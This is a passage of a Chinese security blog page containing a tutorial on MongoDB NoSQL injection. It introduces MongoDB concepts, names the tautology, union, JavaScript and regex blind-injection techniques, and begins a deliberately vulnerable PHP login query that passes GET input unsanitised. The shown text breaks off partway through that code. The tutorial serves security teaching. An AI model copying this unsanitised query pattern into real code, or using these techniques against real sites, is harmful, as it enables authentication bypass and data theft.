@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          NoSQL注入之MongoDB - ca01h&#39;s Blog
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+	
+<link rel="stylesheet" href="/css/fontawesome/all.css">
+
+	
+<script src="/js/fontawesome/all.js"></script>
+
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="ca01h's Blog" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body>
+
+<!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>CA01H&#39;S BLOG</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <h1 id="文章归档"><a href="/archives/index.html"><strong>文章归档</strong></a></h1>
+<h1 id="置顶文章"><strong>置顶文章</strong></h1>
+<ul>
+<li><a href="/Other/6.Linux-Enumeration">Linux Enumeration</a></li>
+</ul>
+<h1 id="Web安全"><strong>Web安全</strong></h1>
+<h2 id="Web安全基础">Web安全基础</h2>
+<ul>
+<li><a href="/Web_security/basic_learning/1.%E5%9C%A8Ubuntu18.04%E5%AE%89%E8%A3%85LNMP">在Ubuntu18.04安装LNMP</a></li>
+<li><a href="/Web_security/basic_learning/2.MySQL%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C">MySQL数据库基本操作</a></li>
+<li><a href="/Web_security/basic_learning/3.MySQL%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%A1%A8%E3%80%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%92%8CHash%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4">MySQL的系统表、文件读写</a></li>
+<li><a href="/Web_security/basic_learning/4.%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0">数据库系统功能相关学习</a></li>
+<li><a href="/Web_security/basic_learning/5.%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0">数据库注入语句的收集和学习</a></li>
+<li><a href="/Web_security/basic_learning/6.Web%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90%E7%9A%84%E6%B5%81%E7%A8%8B%E5%AD%A6%E4%B9%A0">Web页面解析的流程学习</a></li>
+<li><a href="/Web_security/basic_learning/7.%E5%90%84%E7%A7%8D%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99">各种注入类型的环境搭建和代码编写</a></li>
+<li><a href="/Web_security/basic_learning/9.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Basic-Challenge">Sqli-labs手工注入(一)</a></li>
+<li><a href="/Web_security/basic_learning/8.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Advanced-Injections">Sqli-labs手工注入(二)</a></li>
+<li><a href="/Web_security/basic_learning/10.SQLMap%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0">SQLMap入门学习</a></li>
+<li><a href="/Web_security/basic_learning/11.SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5">SQL注入——双查询注入</a></li>
+<li><a href="/Web_security/basic_learning/12.XSS%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0">XSS漏洞实战学习</a></li>
+<li><a href="/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">文件包含漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/14.%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">变量覆盖漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/16.%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">文件上传漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/17.SSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">SSRF漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/18.%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">命令执行漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/19.%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">逻辑漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/20.xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">XXE漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/21.NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB">NoSQL注入之MongoDB</a></li>
+<li><a href="/Web_security/basic_learning/22.SQL%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E4%B9%8BMySQL%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95">SQL注入专项之MySQL基本注入语法</a></li>
+<li><a href="/Web_security/basic_learning/24.%E6%B5%85%E8%B0%88LDAP%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">浅谈LDAP注入攻击</a></li>
+</ul>
+<h2 id="PHP相关">PHP相关</h2>
+<ul>
+<li><a href="/Web_security/php_related/1.PHP%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8">PHP回调后门</a></li>
+<li><a href="/Web_security/php_related/2.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87">PHP反序列化——基础篇</a></li>
+<li><a href="/Web_security/php_related/3.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP反序列化——Phar</a></li>
+<li><a href="/Web_security/php_related/4.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP反序列化——Session</a></li>
+<li><a href="/Web_security/php_related/5.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8">PHP反序列化-原生类利用</a></li>
+<li><a href="/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell">PHP无数字字母构造webshell</a></li>
+<li><a href="/Web_security/php_related/9.%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0PHP%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8">PHP无参数函数的利用</a></li>
+<li><a href="/Web_security/php_related/10.%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF-CRLF%E6%94%BB%E5%87%BB">SoapClient+SSRF+CRLF利用</a></li>
+<li><a href="/Web_security/php_related/12.PHP%E7%9A%84LFI%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93">PHP LFI to RCE</a></li>
+</ul>
+<h2 id="Writeups">Writeups</h2>
+<ul>
+<li><a href="/Web_security/ctf_writeup/3.CGCTF-Writeup">CGCTF-Writeup</a></li>
+<li><a href="/Web_security/ctf_writeup/4.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">BUUCTF—PHP代审</a></li>
+<li><a href="/Web_security/ctf_writeup/5.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E7%AF%87">BUUCTF—PHP框架漏洞</a></li>
+<li><a href="/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">BUUCTF—PHP反序列化</a></li>
+<li><a href="/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5">BUUCTF—SQL注入</a></li>
+<li><a href="/Web_security/ctf_writeup/8.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94XSS">BUUCTF—XSS</a></li>
+<li><a href="/Web_security/ctf_writeup/9.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SSRF">BUUCTF—SSRF</a></li>
+<li><a href="/Web_security/ctf_writeup/10.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">BUUCTF—命令执行</a></li>
+<li><a href="/Web_security/ctf_writeup/11.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">BUUCTF—文件上传</a></li>
+<li><a href="/Web_security/ctf_writeup/12.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">BUUCTF—文件包含</a></li>
+<li><a href="/Web_security/ctf_writeup/13.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Python">BUUCTF—Python</a></li>
+<li><a href="/Web_security/ctf_writeup/14.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94NodeJS">BUUCTF—NodeJS</a></li>
+<li><a href="/Web_security/ctf_writeup/15.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Ruby%E5%8F%8AGo">BUUCTF—Ruby和Go</a></li>
+<li><a href="/Web_security/ctf_writeup/16.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AF%87">BUUCTF—渗透测试</a></li>
+<li><a href="/Web_security/ctf_writeup/17.2020%E7%94%B5%E4%BF%A1%E5%A4%A9%E7%BF%BC%E6%9D%AFCTF%E2%80%94APITest">2020电信天翼杯CTF—APITest</a></li>
+<li><a href="/Web_security/ctf_writeup/18.%E6%98%9F%E7%9B%9F6%E6%9C%88AWD%E5%A4%8D%E7%9B%98%E2%80%94%E2%80%94web+pwn">星盟6月AWD Web+Pwn</a></li>
+<li><a href="/Web_security/ctf_writeup/19.DASCTF2020%E4%B8%83%E6%9C%88%E8%B5%9B">DASCTF2020七月赛 Web</a></li>
+<li><a href="/Web_security/ctf_writeup/20.CSICTF2020">CSICTF2020 Web+Linux</a></li>
+<li><a href="/Web_security/ctf_writeup/21.2020%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9BCTF-Web">2020第五空间CTF Web</a></li>
+<li><a href="/Web_security/ctf_writeup/22.%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AFCTF">首届钓鱼城杯CTF</a></li>
+<li><a href="/Web_security/ctf_writeup/23.DASCTF2020%E5%85%AB%E6%9C%88%E8%B5%9B">DASCTF八月赛</a></li>
+</ul>
+<h1 id="靶机系列"><strong>靶机系列</strong></h1>
+<h2 id="HackTheBox">HackTheBox</h2>
+<ul>
+<li><a href="/Target_drone/HackTheBox/1.HTB-OpenAdmin-walkthrough">HTB::OpenAdmin</a></li>
+<li><a href="/Target_drone/HackTheBox/2.HTB-Postman-walkthrough">HTB::Postman</a></li>
+<li><a href="/Target_drone/HackTheBox/3.HTB-Traverxec-walkthrough">HTB::Traverxec</a></li>
+<li><a href="/Target_drone/HackTheBox/4.HTB-Obscurity-walkthrough">HTB::Obscurity</a></li>
+<li><a href="/Target_drone/HackTheBox/5.HTB-Mongo-walkthrough">HTB::Mongo</a></li>
+<li><a href="/Target_drone/HackTheBox/6.HTB-Tenten-walkthrough">HTB::Tenten</a></li>
+<li><a href="/Target_drone/HackTheBox/7.HTB-Sneaky-walkthrough">HTB::Sneaky</a></li>
+<li><a href="/Target_drone/HackTheBox/8.HTB-Teacher-walkthrough">HTB::Teacher</a></li>
+<li><a href="/Target_drone/HackTheBox/9.HTB-Irked-walkthrough">HTB::Irked</a></li>
+<li><a href="/Target_drone/HackTheBox/10.HTB-Traceback-walkthrough">HTB::Traceback</a></li>
+<li><a href="/Target_drone/HackTheBox/11.HTB-DevOops-walkthrough">HTB::DevOops</a></li>
+<li><a href="/Target_drone/HackTheBox/12.HTB-Blocky-walkthrough">HTB::Blocky</a></li>
+<li><a href="/Target_drone/HackTheBox/13.HTB-Beep-walkthrough">HTB::Beep</a></li>
+<li><a href="/Target_drone/HackTheBox/14.HTB-Book-walkthrough">HTB::Book</a></li>
+<li><a href="/Target_drone/HackTheBox/16.HTB-Craft-walkthrough">HTB::Craft</a></li>
+<li><a href="/Target_drone/HackTheBox/17.HTB-CTF-walkthrough">HTB::CTF</a></li>
+<li><a href="/Target_drone/HackTheBox/15.HTB-Magic-walkthrough">HTB::Magic</a></li>
+</ul>
+<h2 id="VulnHub">VulnHub</h2>
+<ul>
+<li><a href="/Target_drone/VulnHub/1.VulnHub-BossplayersCTF-walkthrough">VulnHub::BossplayersCTF</a></li>
+<li><a href="/Target_drone/VulnHub/2.VulnHub-DC-1-walkthrough">VulnHub::DC-1</a></li>
+<li><a href="/Target_drone/VulnHub/3.VulnHub-DigitalWorld-Local-JOY-walkthrough">VulnHub::DigitalWorld:JOY</a></li>
+</ul>
+<h1 id="代码审计"><strong>代码审计</strong></h1>
+<h2 id="PHP代码审计">PHP代码审计</h2>
+<ul>
+<li><a href="/code_audit/3.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day1">PHP代码审计学习—Day1</a></li>
+<li><a href="/code_audit/4.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day2">PHP代码审计学习—Day2</a></li>
+<li><a href="/code_audit/5.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day3">PHP代码审计学习—Day3</a></li>
+<li><a href="/code_audit/6.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day4">PHP代码审计学习—Day4</a></li>
+<li><a href="/code_audit/7.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day5">PHP代码审计学习—Day5</a></li>
+<li><a href="/code_audit/1.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94yixuncms">PHP代码审计复现—yixuncms</a></li>
+<li><a href="/code_audit/2.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94chinaz">PHP代码审计复现—chinaz</a></li>
+</ul>
+<h1 id="流量分析"><strong>流量分析</strong></h1>
+<ul>
+<li><a href="/Web_security/traffic_analysis/1.Datacon2019-q1-Writeup-v1">Datacon2019-q1-wp-v1</a></li>
+<li><a href="/Web_security/traffic_analysis/2.Datacon2019-q1-Writeup-v2">Datacon2019-q1-wp-v2</a></li>
+<li><a href="/Web_security/traffic_analysis/3.Bro%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">Bro语法学习之基础知识</a></li>
+</ul>
+<h1 id="机器学习"><strong>机器学习</strong></h1>
+<h2 id="基础学习">基础学习</h2>
+<ul>
+<li><a href="/Machine_learning/basic_learning/1.Machine-Learning-Week1">Machine-Learning-Week1</a></li>
+<li><a href="/Machine_learning/basic_learning/2.Machine-Learning-Week2">Machine-Learning-Week2</a></li>
+<li><a href="/Machine_learning/basic_learning/3.Machine-Learning-Week3">Machine-Learning-Week3</a></li>
+<li><a href="/Machine_learning/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84%E8%B5%84%E6%96%99%EF%BC%88%E8%BD%AC%EF%BC%89">机器学习与网络安全相关的资料（转）</a></li>
+</ul>
+<h1 id="Python"><strong>Python</strong></h1>
+<h2 id="Python编程">Python编程</h2>
+<ul>
+<li>
+<p><a href="/Python/code/1.Python%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0">Python函数的参数</a></p>
+</li>
+<li>
+<p><a href="/Python/code/2.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0">Python函数式编程之高阶函数</a></p>
+</li>
+<li>
+<p><a href="/Python/code/3.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E9%97%AD%E5%8C%85">Python函数式编程-闭包</a></p>
+</li>
+<li>
+<p><a href="/Python/code/4.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E8%A3%85%E9%A5%B0%E5%99%A8">Python函数式编程-装饰器</a></p>
+</li>
+<li>
+<p><a href="/Python/code/5.Python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B%E4%B9%8Bslots%E3%80%81@property%E5%92%8C%E5%A4%9A%E9%87%8D%E7%BB%A7%E6%89%BF">Python面向对象高级编程之slots、@property和多重继承</a></p>
+</li>
+<li>
+<p><a href="/Python/code/6.PythonIO%E7%BC%96%E7%A8%8B">PythonIO编程</a></p>
+</li>
+</ul>
+<h1 id="Java"><strong>Java</strong></h1>
+<h2 id="Java编程">Java编程</h2>
+<ul>
+<li><a href="/Java/code/1.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8BJDK%E3%80%81JRE%E3%80%81JVM">Java基础学习之JDK、JRE、JVM</a></li>
+<li><a href="/Java/code/2.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%A0%B8%E5%BF%83%E7%B1%BB">Java基础学习之核心类</a></li>
+<li><a href="/Java/code/3.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80">Java基础学习之面向对象基础</a></li>
+<li><a href="/Java/code/4.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86">Java基础学习之异常处理</a></li>
+</ul>
+<h1 id="算法"><strong>算法</strong></h1>
+<h2 id="Leetcode">Leetcode</h2>
+<ul>
+<li><a href="/Algorithm/1.Leetcode-Primary-class">Leetcode-Primary-class</a></li>
+</ul>
+<h1 id="随笔"><strong>随笔</strong></h1>
+<h2 id="经验">经验</h2>
+<ul>
+<li><a href="/Essay/%E4%BB%8E0%E5%88%B0100%E5%88%86%E7%9A%84%E8%B7%AF%E7%A8%8B%E2%80%94%E2%80%94%E5%86%99%E5%9C%A82019%E5%B9%B4%E7%9A%84%E6%9C%80%E5%90%8E%E4%B8%80%E5%A4%A9">从0到100分的路程——写在2019年的最后一天</a></li>
+</ul>
+<h2 id="技术">技术</h2>
+<ul>
+<li><a href="/Other/1.%E9%98%BF%E9%87%8C%E4%BA%91Centos7-Ngnix%E9%83%A8%E7%BD%B2Hexo">阿里云Centos7-Ngnix部署Hexo</a></li>
+<li><a href="/Other/2.%E9%98%BF%E9%87%8C%E4%BA%91OSS-PicGo%E6%90%AD%E5%BB%BAMarkdown%E5%9B%BE%E5%BA%8A">阿里云OSS-PicGo搭建Markdown图床</a></li>
+<li><a href="/Other/3.Hexo%E6%B8%B2%E6%9F%93LaTeX%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F">Hexo渲染LaTeX数学公式</a></li>
+<li><a href="/Other/4.git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE">Git CheatSheet</a></li>
+<li><a href="/Other/5.Tmux%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%A4%87%E5%BF%98%E5%BD%95">Tmux CheatSheet</a></li>
+</ul>
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="book-post">
+  
+  <i class="fas fa-calendar-day"></i>&nbsp;2020-03-17&nbsp;
+  <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span><span> times</span>&nbsp;
+  <i class="fas fa-file-word"></i>&nbsp;<span class="post-count">4.8k</span>
+  
+  <blockquote>
+<p>文章首发于 信安之路 公众号</p>
+</blockquote>
+<h1 id="NoSQL注入之MongoDB">NoSQL注入之MongoDB</h1>
+<h2 id="0x01-NoSQL和MongoDB">0x01 NoSQL和MongoDB</h2>
+<h3 id="NoSQL">NoSQL</h3>
+<p>NoSQL的概念就不赘述了，以下摘自菜鸟教程。</p>
+<p>NoSQL，指的是非关系型的数据库。NoSQL有时也称作Not Only SQL的缩写，是对不同于传统的关系型数据库的数据库管理系统的统称。NoSQL用于超大规模数据的存储。（例如谷歌或Facebook每天为他们的用户收集万亿比特的数据）。这些类型的数据存储不需要固定的模式，无需多余操作就可以横向扩展。</p>
+<h3 id="MongoDB">MongoDB</h3>
+<p>详细概念建议直接看教程 <a target="_blank" rel="noopener" href="http://www.runoob.com/mongodb/mongodb-tutorial.html">传送门🚪</a>，这里就简单的总结几句。</p>
+<p>在MySQL中，我们所熟知的几个最常见的概念是数据库(Database)、表(Table)、字段(Column)、记录(Record)、索引(Index)，这些术语映射到MongoDB中大概等价于数据库(Database)、集合(Collection)、域(Field)、文档(Document)、索引(Index)。下面就通过官网文档的几张图略作解释。</p>
+<p>文档是由一组键值(key-value)对(即 BSON，Binary JSON)组成。MongoDB 的文档不需要设置相同的字段，并且相同的字段不需要相同的数据类型，例如：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200315141435.png" alt=""></p>
+<p>集合就是 MongoDB 文档组，集合存在于数据库中，集合没有固定的结构，这意味着你对集合可以插入不同格式和类型的数据，但通常情况下我们插入集合的数据都会有一定的关联性。下面这张图展示了这三者之间的关系：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200315141816.png" alt=""></p>
+<p>好了，前置知识部分介绍到这里，下面开始今天的正文部分：MongoDB注入</p>
+<h2 id="0x02-NoSQL注入">0x02 NoSQL注入</h2>
+<p>讲MangoDB注入之前，我们先大致了解一下整个NoSQL注入的流程，下面这张图来自OWASP：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200315112801.png" alt=""></p>
+<p>NoSQL提供了新的数据模型和查询格式，从而可以规避常规的SQL注入攻。但是，它们也为攻击者提供了插入恶意代码的新方法。总的来讲有四种注入手法：</p>
+<p><strong>重言式</strong></p>
+<p>又称为永真式（这个好像是数理逻辑里面的术语），此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。</p>
+<p><strong>联合查询</strong></p>
+<p>联合查询是一种众所周知的SQL注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。</p>
+<p><strong>JavaScript注入</strong></p>
+<p>MongoDB Server支持JavaScript，这使得在数据引擎进行复杂事务和查询成为可能，传递不干净的用户输入到这些查询中可以注入任意JavaScript代码，导致非法的数据获取或篡改。</p>
+<p><strong>盲注</strong></p>
+<p>当页面没有回显时，那么我们可以通过<code>$regex</code>正则表达式来达到和SQL注入中<code>substr()</code>函数相同的功能，而且NoSQL用到的基本上都是布尔盲注。</p>
+<h2 id="0x03-PHP-MongoDB注入">0x03 PHP MongoDB注入</h2>
+<p>在PHP中使用MongoDB你必须使用 MongoDB 的 <a target="_blank" rel="noopener" href="https://pecl.php.net/package/mongodb">PHP驱动</a>，官网上可以看到有很多版本，其中1.0.0版本之后，php_mongodb.dll将不再支持<code>MongoClient</code>类，也就是说，<code>$m = new MongoClient(&quot;mongodb://localhost:27017&quot;);</code>这种调用方式已经被淘汰，而是用命名空间的方式，但是注入的手法和原理是差不多的，这里就主要介绍一下新版PHP驱动进行查询操作MongoDB的三种方法（一般注入也是发生在查询语句中），为了方便，均以GET请求方式为例。</p>
+<p>测试环境</p>
+<ul>
+<li>win10</li>
+<li>PHP 7.3.4</li>
+<li>MongoDB Server 4.2</li>
+<li>php_mongodb.dll 1.7.4</li>
+</ul>
+<h3 id="重言式注入">重言式注入</h3>
+<p>利用<code>executeQuery</code>直接查询：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># 连接数据库</span></span><br><span class="line">$manager = <span class="keyword">new</span> MongoDB\Driver\Manager(<span class="string">&quot;mongodb://localhost:27017&quot;</span>);</span><br><span class="line"></span><br><span class="line">$uname = $_GET[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$pwd = $_GET[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询语句</span></span><br><span 